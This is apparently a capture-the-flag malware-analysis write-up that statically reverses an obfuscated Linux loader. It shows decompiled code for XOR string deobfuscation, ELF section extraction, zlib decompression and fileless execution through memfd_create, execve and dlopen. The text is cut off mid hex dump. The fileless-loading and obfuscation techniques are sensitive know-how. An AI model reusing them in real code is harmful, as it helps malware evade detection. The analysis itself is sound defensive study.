## Task 4 - Unpacking Insight - (Malware Analysis)

> Once back at NSA the team contacts the NSA liaison at FBI to see if they have any information about what was discovered in the configuration data. FBI informs us that the facility registered to host that domain is on a watchlist for suspected criminal activity. With this tip, the FBI acquires a warrant and raids the location. Inside the facility, the server is discovered along with a suspect. The suspect is known to the FBI as a low-level malware actor. During questioning, they disclose that they are providing a service to host malware for various cybercrime groups, but recently they were contacted by a much more secretive and sophisticated customer. While they don't appear to know anything about who is paying for the service, they provide the FBI with the malware that was hosted.

> Back at NSA, you are provided with a copy of the file. There is a lot of high level interest in uncovering who facilitated this attack. The file appears to be obfuscated.

> You are tasked to work on de-obfuscating the file and report back to the team.


> Downloads: obfuscated file (suspicious)

> Prompt: Submit the file path the malware uses to write a file

### Solve:

This one was probably my favorite task. 

If you read my other write ups, you know that I usually use a combination of Ghidra and Binja. For this task, Binja ended up being more useful at first (or at least, sort of easier to read the dissassembly compared to what Ghidra was giving me), and then I ended off the task with Ghidra. 

First, we can load the binary, `suspicious`, into Binja and start looking at what we're working with

I do just want to preface that I did this entire task statically. It is possible to do it dynamically, or a little bit of both, but the binary has multiple debugger checks, and to just avoid dealing with any of that, I went with a purely static approach. Also, I figured it'd be safer considering the fact that the binary is very likely malware

> Note that the below dissassembly snippets already show renamed function names as a result of my analysis

Beginning with main, immediately we see some really weird stuff going on

```c
00002680  int32_t main(int32_t argc, char** argv, char** envp)

000026b6      void* var_190
000026b6      int64_t* r12 = &var_190
000026c2      double zmm1
000026c2      double var_228 = zmm1
000026d1      void* fsbase
000026d1      int64_t rax = *(fsbase + 0x28)
000026e4      int128_t obfuscated_blob1
000026e4      __builtin_memcpy(dest: &obfuscated_blob1, src: "\x4f\x5e\x0c\x5a\x17\x17\x07\x5a\x00\x5b\x0d\x42\x40\x0c\x1a\x15\x57\x5b\x0b\x56\x05\x4d\x0c\x5c\x08\x00", n: 0x1a)
000026fb      int32_t s
000026fb      __builtin_memset(&s, c: 0, n: 0x3c)
00002776      int128_t brainrot1
00002776      __builtin_strcpy(dest: &brainrot1, src: "mrbeast_really_said_lets_give_random_people_skibidi_toilet_merchandise_for_free")
00002786      char const* const var_158 = "sudoers"
000027ce      int128_t obfuscated_blob2
000027ce      __builtin_memcpy(dest: &obfuscated_blob2, src: "\x43\x1b\x0c\x0c\x15\x5d\x17\x30\x1c\x16\x15\x1e\x19\x1a\x2b\x1c\x13\x1a\x4a\x38\x00\x0a\x16\x12\x33\x00", n: 0x1a)
000027ee      int128_t brainrot2
000027ee      __builtin_strcpy(dest: &brainrot2, src: "speed_running_through_ohio_while_the_skibidi_toilet_song_plays_on_repeat")
0000283e      int128_t obfuscated_blob3
0000283e      __builtin_memcpy(dest: &obfuscated_blob3, src: "\x5d\x12\x16\x16\x3b\x2c\x17\x16\x1b\x1c\x0c\x31\x05\x2a\x12\x0e\x17\x1d\x00", n: 0x13)
0000285c      int32_t var_168[0x4] = _mm_unpacklo_epi64(zx.o("users"), "temp_users")
00002864      int32_t* rbx = &s
00002877      int32_t result
00002877      char* var_1a0
00002877      int64_t var_170
00002877      int64_t r14_1

...
...
A lot more code after this
...
...
```

This binary is obfuscated alright, but it seems to be obfuscated with brainrot. 

There's a lot of red herrings here (the `main` function is pretty long), which is expected given the obfuscation. I'll just skip to the important parts. 

Firstly, in the `main` function, there's some weird sections like below

```c
0000311d          r14_1 = (*"to griddy dance because this man…")[0].q
00003124          r15_3 = rax_44
00003124          
0000312a          if (rax_44 == 0)
0000312a              goto label_327e
0000312a          
0000314e          *rax_44 = obfuscated_blob3
00003158          *(r15_3 + 0xf) = obfuscated_blob3:0xf.d
00003158          
00003161          if (r14_1(&brainrot2, 0x49, r15_3, 0x13) != 0)
00003161              goto cooked
```

Firstly, since you'll see it a lot later on, `cooked` is a label that essentially just contains some code that ends / exists the program. Whenever the binary reaches some sort of fail state, or you fail a debugger check, it jumps to this label.

Ignoring my renaming of some labels, variables, and functions, the interesting thing is `r14_1` being assigned a value extracted from the memory of a brainrot string literal.

```c
r14_1 = (*"to griddy dance because this man…")[0].q
```

Then that is used later on as a function call

```c
if (r14_1(&brainrot2, 0x49, r15_3, 0x13) != 0)
    goto cooked
```

This is pretty clear that it's trying to hide a function by using a function pointer, with the brainrot string being used to identify that function pointer

Well, what exactly is the function it's trying to call?

Well, we can piece that together from some context clues. My variable renaming sort of spoils it, but we can see that one of the parameters is `&brainrot2`

Also, `r15_3` is assigned to what I call an obfuscated blob. 

These can actually be seen at the beginning of `main` that I showed earlier

```c
000026e4      int128_t obfuscated_blob1
000026e4      __builtin_memcpy(dest: &obfuscated_blob1, src: "\x4f\x5e\x0c\x5a\x17\x17\x07\x5a\x00\x5b\x0d\x42\x40\x0c\x1a\x15\x57\x5b\x0b\x56\x05\x4d\x0c\x5c\x08\x00", n: 0x1a)
000026fb      int32_t s
000026fb      __builtin_memset(&s, c: 0, n: 0x3c)
00002776      int128_t brainrot1
00002776      __builtin_strcpy(dest: &brainrot1, src: "mrbeast_really_said_lets_give_random_people_skibidi_toilet_merchandise_for_free")
00002786      char const* const var_158 = "sudoers"
000027ce      int128_t obfuscated_blob2
000027ce      __builtin_memcpy(dest: &obfuscated_blob2, src: "\x43\x1b\x0c\x0c\x15\x5d\x17\x30\x1c\x16\x15\x1e\x19\x1a\x2b\x1c\x13\x1a\x4a\x38\x00\x0a\x16\x12\x33\x00", n: 0x1a)
000027ee      int128_t brainrot2
000027ee      __builtin_strcpy(dest: &brainrot2, src: "speed_running_through_ohio_while_the_skibidi_toilet_song_plays_on_repeat")
0000283e      int128_t obfuscated_blob3
0000283e      __builtin_memcpy(dest: &obfuscated_blob3, src: "\x5d\x12\x16\x16\x3b\x2c\x17\x16\x1b\x1c\x0c\x31\x05\x2a\x12\x0e\x17\x1d\x00", n: 0x13)
```

Basically, there are variables containing brainrot strings, and variables containing what appear to be obfuscated blobs

Whatever function is being called, my assumption was that it is somehow using the brainrot strings to deobfuscate the obfuscated blobs. 

Going through the functions in Binja, we are able to find a likely culprit

I called the function `potential_deobf`

```c
000033a0  int64_t potential_deobf(int64_t arg1, int64_t arg2, char* arg3, int64_t arg4)

000033b2      if (arg1 == 0 || arg3 == 0)
000033ed          return 1
000033ed      
000033bc      int64_t i = 0
000033bc      
000033c2      if (arg4 != 1)
000033e0          do
000033d5              arg3[i] ^= *(arg1 + modu.dp.q(0:i, arg2 - 1))
000033d9              i += 1
000033e0          while (arg4 - 1 != i)
000033e0      
000033e4      return 0
```

So we can use this function to try to deobfuscate some of those blobs. 

Also just as a note, the first blob for some reason doesn't use this function, and the deobfuscation logic is just done completely in `main`

```c
00002ca3          int128_t obfuscated_blob1_1 = obfuscated_blob1
00002cb4          *rax_19 = obfuscated_blob1
00002cb7          *(rax_19 + 0xa) = obfuscated_blob1_1
00002cbf          uint128_t zmm0_2 = *rax_19 ^ xor_key1[0].o
00002cc7          *(rax_19 + 0x18) ^= 0x66
00002ccb          *rax_19 = zmm0_2
00002cd7          rax_19[1].q = (zx.o(rax_19[1].q) ^ zx.o(0x3365396432623736)).q
```

A little weird, but we can work with it. I ended up making the below Python script

```python

### FOR BLOB 1 ###

def xor_deobfuscate(data_bytes, key_bytes):
    return bytes([b ^ key_bytes[i % len(key_bytes)] for i, b in enumerate(data_bytes)])

hex_blob = b"\x4f\x5e\x0c\x5a\x17\x17\x07\x5a\x00\x5b\x0d\x42\x40\x0c\x1a\x15\x57\x5b\x0b\x56\x05\x4d\x0c\x5c\x08\x00"

# Key for the first blob
xor_key = b"a7b3c9d2e8f15a4cO^"

# Deobfuscate:
deobfuscated = xor_deobfuscate(hex_blob, xor_key)
print(deobfuscated.decode('utf-8', errors='replace'))  # Or just print(deobfuscated) for raw bytes

## FOR BLOB 2 AND 3 ###

def rolling_xor_deobfuscate(key, key_len, data, data_len):
    out = bytearray(data)
    for i in range(data_len - 1):  # matches `if (arg4 != 1)` logic
        out[i] ^= key[i % (key_len - 1)]
    return out

# Blob 2
key = b"mrbeast_really_said_lets_give_random_people_skibidi_toilet_merchandise_for_free"
key_len = 0x50
blob2 = b"\x43\x1b\x0c\x0c\x15\x5d\x17\x30\x1c\x16\x15\x1e\x19\x1a\x2b\x1c\x13\x1a\x4a\x38\x00\x0a\x16\x12\x33\x00"
data_len = 0x1a

# Deobfuscate
result = rolling_xor_deobfuscate(key, key_len, blob2, data_len)
print(result.decode("utf-8", errors="replace"))

# Blob 3
key = b"speed_running_through_ohio_while_the_skibidi_toilet_song_plays_on_repeat"
key_len = len(key)  
blob3 = b"\x5d\x12\x16\x16\x3b\x2c\x17\x16\x1b\x1c\x0c\x31\x05\x2a\x12\x0e\x17\x1d\x00"
data_len = len(blob3)  

# Deobfuscate
result = rolling_xor_deobfuscate(key, key_len, blob3, data_len)
print(result.decode('utf-8', errors='replace'))
```

Running this results in:

```
.init.checksum.vjag~oel2
.init.constructors.global
.bss_secure_buffer
```

Ok interesting, these blobs are deobfuscating into what appears to be sections of the program itself. Seems like some more analysis is in order. 

#### Rev harder

Firstly, we find a function that appears to extract sections of a program based on the section name

```c
00005aa0  uint64_t extract_resource_from_file(char* arg1, char* arg2, int64_t* arg3, 
00005aa0      uint64_t* arg4)

00005ac5      void* fsbase
00005ac5      int64_t rax = *(fsbase + 0x28)
00005ada      FILE* s
00005ada      __builtin_memset(&s, c: 0, n: 0x20)
00005b08      int32_t rbx_1
00005b08      void* r13
00005b08      void* var_58
00005b08      
00005b08      if (open_wrapper(&s, "r", arg1) == 0)
00005b67          int64_t var_50
00005b67          int32_t rax_5 = sub_5720(s, &var_58, &var_50)
00005b6c          r13 = var_58
00005b6c          
00005b73          if (rax_5 != 0)
00005bd8              rbx_1 = 1
00005b73          else
00005b85              void* var_48
00005b85              int32_t rax_6 = locate_elf_section(arg2, r13, var_50.b, &var_48)
00005b8a              rbx_1 = rax_6
00005b8a              
00005b8e              if (rax_6 != 0)
00005bd8                  rbx_1 = 1
00005b8e              else
00005b90                  void* r15_1 = var_48
00005b90                  
00005b98                  if (r15_1 == 0)
00005bd8                      rbx_1 = 1
00005b98                  else
00005b9a                      uint64_t size = *(r15_1 + 0x20)
00005ba3                      *arg4 = size
00005baa                      int64_t rax_7 = calloc(nmemb: 1, size)
00005baf                      *arg3 = rax_7
00005baf                      
00005bb9                      if (rax_7 == 0)
00005bd8                          rbx_1 = 1
00005bb9                      else
00005bc8                          __memcpy_chk(rax_7, *(r15_1 + 0x18) + r13, size, size)
00005b08      else
00005b0a          r13 = var_58
00005b0f          rbx_1 = 1
00005b0f      
00005b17      if (r13 != 0)
00005b1c          free(ptr: r13)
00005b1c      
00005b21      FILE* fp = s
00005b21      
00005b29      if (fp != 0)
00005b2b          fclose(fp)
00005b2b      
00005b35      *(fsbase + 0x28)
00005b35      
00005b3e      if (rax == *(fsbase + 0x28))
00005b54          return zx.q(rbx_1)
00005b54      
00005be2      __stack_chk_fail()
00005be2      noreturn
```

So it appears that the malware has the section names obfuscated, it deobfuscates the name with the function we found, then extracts what's in that section. The question is what does it do with the data now that it's extracted

Eventually, we hit what appears to be the jackpot

```c
0000320c              if (lzss_like_compress(var_1a0, var_188, var_190, var_198) != -1)
00003234                  if (prob_zlib_decompress_caller(var_1a0, var_198, r12, &var_188) != 0)
00003234                      goto cooked
00003234                  
00003251                  if (memfd_dlopen_or_execve_malware(var_190, var_188) != 0)
00003251                      goto cooked
```

Of course, my function renaming spoils the surprise. 

First, we have a function that does some sort of LZSS like compression, which I name `lzss_like_compress`. That part isn't that important though. 

What's really important is the next 2 functions, specifically the 3rd one

We have a function that tries to perform a `zlib` decompression on the passed in data

```c
000037b0  int64_t prob_zlib_decompress_caller(int64_t arg1, int64_t arg2, int64_t* arg3, 
000037b0      size_t* arg4)

000037bd      int64_t* r13 = arg3
000037d0      void* fsbase
000037d0      int64_t rax = *(fsbase + 0x28)
000037e3      bool cond:0 = arg3 == 0
000037e9      int64_t s
000037e9      __builtin_memset(&s, c: 0, n: 0x68)
000037f2      arg3.b = arg4 == 0
00003800      int32_t result
00003800      
00003800      if ((cond:0 | arg3.b) == 0 && arg1 != 0)
00003806          size_t size = arg2 * 2
0000380a          int32_t var_a0_1 = arg2.d
00003816          s = arg1
0000381a          int64_t rax_2 = calloc(nmemb: 1, size)
0000381f          int64_t r15_1 = rax_2
0000381f          
00003825          if (rax_2 != 0)
0000382b              *arg4 = size
0000382b              
00003839              if (sub_aff0(&s) != 0)
00003910                  free(ptr: r15_1)
00003839              else
0000383f                  size_t n = *arg4
00003881                  int32_t i
00003881                  
00003881                  do
00003897                      size_t var_80
00003897                      int64_t var_90_1 = r15_1 + var_80
0000389c                      int32_t var_88_1 = n.d - var_80.d
000038a0                      i = prob_zlib_inflate(&s, 0)
000038a0                      
000038ab                      if (i == 1)
000039a3                          result = sub_d120(&s)
000039a3                          
000039aa                          if (result != 0)
000039aa                              goto label_3908
000039aa                          
000039b5                          *r13 = r15_1
000039b9                          *arg4 = var_80
000039bd                          goto label_391f
000039bd                      
000038b1                      n = *arg4
000038b8                      double zmm0_1
000038b8                      double zmm1_1
000038b8                      int64_t var_98
000038b8                      int64_t rax_5
000038b8                      
000038b8                      if (n s>= 0)
0000384f                          zmm0_1 = float.d(n)
00003854                          rax_5 = r15_1 - var_98
00003854                          
00003859                          if (r15_1 - var_98 s< 0)
000038f4                              zmm1_1 = float.d(rax_5 u>> 1 | zx.q(rax_5.d & 1))
000038f9                              zmm1_1 = zmm1_1 + zmm1_1
00003859                          else
00003863                              zmm1_1 = float.d(rax_5)
000038b8                      else
000038cd                          zmm0_1 = float.d(n u>> 1 | zx.q(n.d & 1))
000038d5                          zmm0_1 = zmm0_1 + zmm0_1
000038d9                          rax_5 = r15_1 - var_98
000038d9                          
000038de                          if (r15_1 - var_98 s>= 0)
00003863                              zmm1_1 = float.d(rax_5)
000038de                          else
000038f4                              zmm1_1 = float.d(rax_5 u>> 1 | zx.q(rax_5.d & 1))
000038f9                              zmm1_1 = zmm1_1 + zmm1_1
000038f9                      
00003878                      if (zmm1_1 > 0.75 * zmm0_1)
0000394c                          zmm0_1 = zmm0_1 + 0.25 * zmm0_1
0000394c                          
00003958                          if (zmm0_1 >= 9.2233720368547758e+18)
00003997                              n = int.q(zmm0_1 - 9.2233720368547758e+18) ^ 0x8000000000000000
00003958                          else
0000395a                              n = int.q(zmm0_1)
0000395a                          
00003965                          int64_t rax_12 = realloc(ptr: r15_1, n)
00003965                          
0000396d                          if (rax_12 == 0)
0000396d                              break
0000396d                          
0000396f                          *arg4 = n
00003973                          r15_1 = rax_12
00003881                  while (i == 0)
00003908                  label_3908:
00003908                  
0000390b                  if (r15_1 != 0)
00003910                      free(ptr: r15_1)
00003910      
00003915      result = 1
0000391f      label_391f:
0000391f      *(fsbase + 0x28)
0000391f      
00003928      if (rax == *(fsbase + 0x28))
0000393c          return result
0000393c      
000039c2      __stack_chk_fail()
000039c2      noreturn
```

Once the `zlib` decompression occurs, it takes the result (which I assumed to be some sort of malware) and tries to run it in two ways based on a certain condition

```c
if (memfd_dlopen_or_execve_malware(var_190, var_188) != 0)
    goto cooked
```

```c
00005da0  uint64_t memfd_dlopen_or_execve_malware(int64_t arg1, uint64_t arg2)

00005db6      void* fsbase
00005db6      int64_t rax = *(fsbase + 0x28)
00005dd5      int128_t brainrot4
00005dd5      __builtin_strncpy(dest: &brainrot4, src: "skibidi_toilet_ohio_rizz_gyatt_sigma_male_grindset_mewing_streak", n: 0x41)
00005e24      int32_t rbx_2
00005e24      
00005e24      if (arg1 == 0 || arg2 == 0)
00005f80          rbx_2 = 1
00005e24      else if (*(arg1 + 0x18) != 0)
00005f55          rbx_2 = execve_malware(arg1, arg2)
00005e32      else
00005e41          int32_t fd = memfd_create(&data_19061, 0)
00005e46          uint64_t fd_1 = zx.q(fd)
00005e46          
00005e4c          if (fd == 0xffffffff)
00005f80              rbx_2 = 1
00005e4c          else if (write(fd, buf: arg1, nbytes: arg2) == 0)
00005f80              rbx_2 = 1
00005e62          else
00005e72              int64_t* rax_2 = calloc(nmemb: 1, size: 0xf)
00005e72              
00005e7d              if (rax_2 == 0)
00005f80                  rbx_2 = 1
00005e7d              else
00005e9a                  *rax_2 = 0x3a1a4b0a0d1b1b5c
00005ea3                  *(rax_2 + 7) = 0x5b010a4609183a
00005ea7                  int32_t rax_3 = (*"to griddy dance because this man…")[0].q(&brainrot4, 0x41, rax_2, 0xf)
00005ead                  rbx_2 = rax_3
00005eb1                  char* s
00005eb1                  
00005eb1                  if (rax_3 == 0)
00005ec1                      s = calloc(nmemb: 1, size: 0x19)
00005ec1                  
00005ecc                  if (rax_3 != 0 || s == 0)
00005f7b                      free(ptr: rax_2)
00005f80                      rbx_2 = 1
00005ecc                  else
00005ef6                      int32_t rax_5 = __snprintf_chk(s, maxlen: 0x19, flag: 2, slen: 0x19, format: "%s%d", rax_2, fd_1)
00005eff                      int64_t rax_6
00005eff                      int64_t var_90
00005eff                      
00005eff                      if (rax_5 s>= 0)
00005f0d                          rax_6 = dlopen(s, 1, fd_1, var_90)
00005f0d                      
00005f18                      if (rax_5 s< 0 || rax_6 == 0)
00005f93                          free(ptr: rax_2)
00005f9b                          free(ptr: s)
00005f80                          rbx_2 = 1
00005f18                      else
00005f24                          int64_t rax_7 = dlsym(rax_6, &data_19076)
00005f24                          
00005f2f                          if (rax_7 == 0)
00005fa5                              rbx_2 = 1
00005faa                              free(ptr: rax_2)
00005f2f                          else
00005f33                              rax_7()
00005f38                              free(ptr: rax_2)
00005f38                          
00005f40                          free(ptr: s)
00005f48                          dlclose(rax_6)
00005f48      
00005f5c      *(fsbase + 0x28)
00005f5c      
00005f65      if (rax == *(fsbase + 0x28))
00005f73          return zx.q(rbx_2)
00005f73      
00005fb1      __stack_chk_fail()
00005fb1      noreturn
```

Basically, what this is doing is that it checks if the malware it wants to execute is a shared library or a standalone executable. This is seen in this check

```c
else if (*(arg1 + 0x18) != 0)
    rbx_2 = execve_malware(arg1, arg2)
```

The offset `0x18` in an ELF is used to store the entry point. Standalone executables have an entry point, and this offset will be non zero. However, for a shared library, it doesn't have an entry point, and therefore would be 0. 

This check essentially performs an `execve` on the malware contents to run it as a standalone executable if it detects that it is one

```c
00005bf0  uint64_t execve_malware(int64_t arg1, uint64_t arg2)

00005c04      void* fsbase
00005c04      int64_t rax = *(fsbase + 0x28)
00005c21      int128_t var_58 = zx.o(0)
00005c25      int64_t brainrot3
00005c25      __builtin_strncpy(dest: &brainrot3, src: "skibbity", n: 9)
00005c34      int64_t var_3f = 0x1c0746010d1b1b5c
00005c43      var_3f = 0x460604460d1f1c
00005c4b      int64_t* rax_1
00005c4b      
00005c4b      if (arg1 != 0)
00005c61          rax_1 = calloc(nmemb: 1, size: 0xf)
00005c61      
00005c6c      int32_t r12
00005c6c      
00005c6c      if (arg1 == 0 || rax_1 == 0)
00005d50          r12 = 1
00005c6c      else
00005c89          *rax_1 = var_3f
00005c91          *(rax_1 + 7) = var_3f
00005c95          int32_t rax_4 = (*"to griddy dance because this man…")[0].q(&brainrot3, 9, rax_1, 0xf)
00005c9b          r12 = rax_4
00005c9b          
00005ca0          if (rax_4 != 0)
00005d90              r12 = 1
00005ca0          else
00005caf              int32_t fd = memfd_create(&data_19061, 0)
00005caf              
00005cba              if (fd == 0xffffffff)
00005d90                  r12 = 1
00005cba              else if (write(fd, buf: arg1, nbytes: arg2) == 0)
00005d90                  r12 = 1
00005cd0              else
00005ce0                  char* s = calloc(nmemb: 1, size: 0x19)
00005ce0                  
00005ceb                  if (s == 0)
00005d90                      r12 = 1
00005ceb                  else if (__snprintf_chk(s, maxlen: 0x19, flag: 2, slen: 0x19, format: "%s%d", rax_1, zx.q(fd)) s< 0)
00005d83                      free(ptr: s)
00005d90                      r12 = 1
00005d1e                  else
00005d2d                      var_58.q = s
00005d3c                      int64_t var_60
00005d3c                      
00005d3c                      if (execve(s, &var_58, __bss_start, var_60) == 0xffffffff)
00005d83                          free(ptr: s)
00005d90                          r12 = 1
00005d3c                      else
00005d3e                          free(ptr: s)
00005d3e          
00005d46          free(ptr: rax_1)
00005d46      
00005d5b      *(fsbase + 0x28)
00005d5b      
00005d64      if (rax == *(fsbase + 0x28))
00005d75          return zx.q(r12)
00005d75      
00005d98      __stack_chk_fail()
00005d98      noreturn
```

Otherwise, it dynamically will load the shared library from a memfd

First it creates a memfd

```c
00005e41          int32_t fd = memfd_create(&data_19061, 0)
00005e46          uint64_t fd_1 = zx.q(fd)
```

It also saves the file descriptor that was created

It then writes the malware payload into the memfd

```c
00005e4c          else if (write(fd, buf: arg1, nbytes: arg2) == 0)
00005f80              rbx_2 = 1
```

It then wants to call `dlopen` on what is in that memfd, but `dlopen` takes a path, not a fd as input. 

To resolve this, it performs this `snprintf` call with obfuscated values to build a filepath to the memfd

```c
00005e9a                  *rax_2 = 0x3a1a4b0a0d1b1b5c
00005ea3                  *(rax_2 + 7) = 0x5b010a4609183a
00005ea7                  int32_t rax_3 = (*"to griddy dance because this man…")[0].q(&brainrot4, 0x41, rax_2, 0xf)
00005ead                  rbx_2 = rax_3
00005eb1                  char* s
00005eb1                  
00005eb1                  if (rax_3 == 0)
00005ec1                      s = calloc(nmemb: 1, size: 0x19)
00005ec1                  
00005ecc                  if (rax_3 != 0 || s == 0)
00005f7b                      free(ptr: rax_2)
00005f80                      rbx_2 = 1
00005ecc                  else
00005ef6                      int32_t rax_5 = __snprintf_chk(s, maxlen: 0x19, flag: 2, slen: 0x19, format: "%s%d", rax_2, fd_1)
```

This is using that same deobfuscation function from earlier. If we use that same logic to deobfuscate this new blob, it results in `/proc/self/fd/`

So this `snprintf` call is building the filepath `/proc/self/fd/<whatever fd was returned by memfd_create>`

It's essentially just trying to hide the path that it is calling

It then calls `dlopen` on the memfd to dynamically load the shared library

```c
00005f0d                          rax_6 = dlopen(s, 1, fd_1, var_90)
```

It then dynamically loads a symbol (a function) and executes it


```c
00005f24                          int64_t rax_7 = dlsym(rax_6, &data_19076)
00005f24                          
00005f2f                          if (rax_7 == 0)
00005fa5                              rbx_2 = 1
00005faa                              free(ptr: rax_2)
00005f2f                          else
00005f33                              rax_7()
```

That function it tries to execute is named `run`

![image1](./images/task4img1.png)

Ok, that was a lot of information. What is the conclusion? 

This binary we are analyzing is some sort of malware loader. 

It takes some kind of malware payload, which it assumes to be `zlib` compressed, decompresses it, then executes it if it is a standalone executable or dynamically loads and executes the function `run` if it is a shared library. 

Now the next question is, what exactly is the malware payload it is loading?

This is where those sections from earlier come into play

#### Rev-ception

`main` extracts the contents of what was in the second obfuscated blob

```c
00003100          if (extract_resource_from_file(*argv, r15_3, &var_1a0, &var_198) != 0)
```

Which we now know to be `.init.constructors.global`

It also extracts the contents of what was in the third obfuscated blob

```c
000031a2              if (extract_resource_from_file(*argv, r15_3, &var_180, &var_178) != 0)
```

Which we now know to be `.bss_secure_buffer`

It performs the deobfuscation logic that we found earlier with the content in these 2 sections as input

```c
000031dd              if ((*"to griddy dance because this man…")[0].q(var_180, var_178, var_1a0, var_198) != 0)
```

It then performs the zlib decompression and malware execution on the contents of said deobfuscation

```c
0000320c              if (lzss_like_compress(var_1a0, var_188, var_190, var_198) != -1)
00003234                  if (prob_zlib_decompress_caller(var_1a0, var_198, r12, &var_188) != 0)
00003234                      goto cooked
00003234                  
00003251                  if (memfd_dlopen_or_execve_malware(var_190, var_188) != 0)
00003251                      goto cooked
```

So what is located in `.init.constructors.global` and `.bss_secure_buffer`?

We can use `readelf` for this

`.bss_secure_buffer` appears to be the brainrot string

```
readelf -x .bss_secure_buffer ./suspicious
```

returns

```
Hex dump of section '.bss_secure_buffer':
  0x00023098 596f2079 6f20796f 2c206e6f 20636170 Yo yo yo, no cap
  0x000230a8 20667220 66722c20 77616c6b 696e6720  fr fr, walking 
  0x000230b8 696e746f 20746861 74204d6f 6e646179 into that Monday
  0x000230c8 206d6f72 6e696e67 20737461 6e647570  morning standup
  0x000230d8 20686164 206d6520 6665656c 696e6720  had me feeling 
  0x000230e8 6c696b65 20746865 204f6869 6f206669 like the Ohio fi
  0x000230f8 6e616c20 626f7373 20696e20 736f6d65 nal boss in some
  0x00023108 20736b69 62696469 20746f69 6c657420  skibidi toilet 
  0x00023118 636f6465 20726576 69657720 676f6e65 code review gone
  0x00023128 2077726f 6e672e20 54686520 74656368  wrong. The tech
  0x00023138 206c6561 64207265 616c6c79 2070756c  lead really pul
  0x00023148 6c656420 75702061 6e642073 61696420 led up and said 
  0x00023158 22776520 6e656564 20746f20 72656661 "we need to refa
  0x00023168 63746f72 20746869 73206c65 67616379 ctor this legacy
  0x00023178 20636f64 65626173 65222077 68696c65  codebase" while
  0x00023188 2049276d 20736974 74696e67 20746865  I'm sitting the
  0x00023198 7265206d 6577696e 67207769 7468206d re mewing with m
  0x000231a8 6178696d 756d2067 79617474 20656e65 aximum gyatt ene
  0x000231b8 7267792c 20747279 696e6720 6e6f7420 rgy, trying not 
  0x000231c8 746f2067 72696464 79206461 6e636520 to griddy dance 
  0x000231d8 62656361 75736520 74686973 206d616e because this man
  0x000231e8 20746869 6e6b7320 68652773 20676f74  thinks he's got
  0x000231f8 20746861 74203130 7820656e 67696e65  that 10x engine
  0x00023208 65722073 69676d61 20677269 6e647365 er sigma grindse
  0x00023218 74206275 74206865 27732073 65727669 t but he's servi
  0x00023228 6e67206d 616a6f72 206a756e 696f7220 ng major junior 
  0x00023238 64657620 62657461 20766962 65732c20 dev beta vibes, 
  0x00023248 6f6e6c79 20696e20 4f68696f 20776f75 only in Ohio wou
  0x00023258 6c642073 6f6d656f 6e652070 75736820 ld someone push 
  0x00023268 64697265 63746c79 20746f20 6d61696e directly to main
  0x00023278 20627275 682e204d 65616e77 68696c65  bruh. Meanwhile
  0x00023288 2c205361 72616820 66726f6d 20446576 , Sarah from Dev
  0x00023298 4f707320 69732073 74726169 67687420 Ops is straight 
  0x000232a8 75702072 697a7a69 6e672074 6865206c up rizzing the l
  0x000232b8 69666520 6f757420 6f662074 68657365 ife out of these
  0x000232c8 2043492f 43442070 6970656c 696e6573  CI/CD pipelines
  0x000232d8 20776974 68206865 7220446f 636b6572  with her Docker
  0x000232e8 20636f6e 66696775 72617469 6f6e7320  configurations 
  0x000232f8 74686174 20686974 20646966 66657265 that hit differe
  0x00023308 6e74202d 20686f6d 65676972 6c20676f nt - homegirl go
  0x00023318 74207468 61742073 6b696269 64692062 t that skibidi b
  0x00023328 6f702062 6f702064 65706c6f 796d656e op bop deploymen
  0x00023338 74206761 6d652c20 77652061 62736f6c t game, we absol
  0x00023348 7574656c 79207374 616e2061 2070726f utely stan a pro
  0x00023358 64756374 69766520 71756565 6e207768 ductive queen wh
  0x00023368 6f277320 6d657769 6e672068 65722077 o's mewing her w
  0x00023378 61792074 68726f75 6768204b 75626572 ay through Kuber
  0x00023388 6e657465 73206d61 6e696665 73747320 netes manifests 
  0x00023398 6c696b65 20736865 27732044 756b6520 like she's Duke 
  0x000233a8 44656e6e 69732074 65616368 696e6720 Dennis teaching 
  0x000233b8 636f6e74 61696e65 72206f72 63686573 container orches
  0x000233c8 74726174 696f6e2e 20546865 2077686f tration. The who
  0x000233d8 6c652074 65616d20 77617320 6c6f776b le team was lowk
  0x000233e8 65792066 616e756d 20746178 696e6720 ey fanum taxing 
  0x000233f8 65616368 206f7468 65722773 20476974 each other's Git
  0x00023408 48756220 636f6d6d 69747320 7768696c Hub commits whil
  0x00023418 65206772 69646479 2064616e 63696e67 e griddy dancing
  0x00023428 2061726f 756e6420 74686573 65207370  around these sp
  0x00023438 72696e74 20646561 646c696e 65732c20 rint deadlines, 
  0x00023448 62757420 686f6e65 73746c79 3f205468 but honestly? Th
  0x00023458 69732074 65636820 73746163 6b206973 is tech stack is
  0x00023468 20616273 6f6c7574 656c7920 62757373  absolutely buss
  0x00023478 696e2062 75737369 6e206e6f 20636170 in bussin no cap
  0x00023488 2c207765 27726520 616c6c20 6665656c , we're all feel
  0x00023498 696e6720 6d6f7265 20626c65 73736564 ing more blessed
  0x000234a8 20746861 6e204261 62792047 726f6e6b  than Baby Gronk
  0x000234b8 20676574 74696e67 20686973 20666972  getting his fir
  0x000234c8 73742070 756c6c20 72657175 65737420 st pull request 
  0x000234d8 6d657267 65642062 79204c69 76767920 merged by Livvy 
  0x000234e8 44756e6e 652e2057 68656e20 74686520 Dunne. When the 
  0x000234f8 70726f64 75637420 6d616e61 67657220 product manager 
  0x00023508 616e6e6f 756e6365 64207765 27726520 announced we're 
  0x00023518 73776974 6368696e 6720746f 20547970 switching to Typ
  0x00023528 65536372 6970742c 20746865 20636f6c eScript, the col
  0x00023538 6c656374 69766520 67796174 7420656e lective gyatt en
  0x00023548 65726779 20696e20 74686174 20776172 ergy in that war
  0x00023558 20726f6f 6d207761 73206769 76696e67  room was giving
  0x00023568 20756e6d 61746368 6564204f 68696f20  unmatched Ohio 
  0x00023578 76696265 732c206c 696b6520 7765206a vibes, like we j
  0x00023588 75737420 7769746e 65737365 64207468 ust witnessed th
  0x00023598 6520736b 69626964 6920746f 696c6574 e skibidi toilet
  0x000235a8 206f6620 70726f67 72616d6d 696e6720  of programming 
  0x000235b8 6c616e67 75616765 7320636f 6d70696c languages compil
  0x000235c8 6520696e 20726561 6c207469 6d652e20 e in real time. 
  0x000235d8 546f7563 68206772 6173733f 204e6168 Touch grass? Nah
  0x000235e8 20626573 7469652c 20776527 72652074  bestie, we're t
  0x000235f8 6f756368 696e6720 6b657962 6f617264 ouching keyboard
  0x00023608 7320616e 64206c69 76696e67 206f7572 s and living our
  0x00023618 206d6f73 74207369 676d6120 64657665  most sigma deve
  0x00023628 6c6f7065 72206c69 66652077 68696c65 loper life while
  0x00023638 20746865 20696d70 6f73746f 7220616d  the impostor am
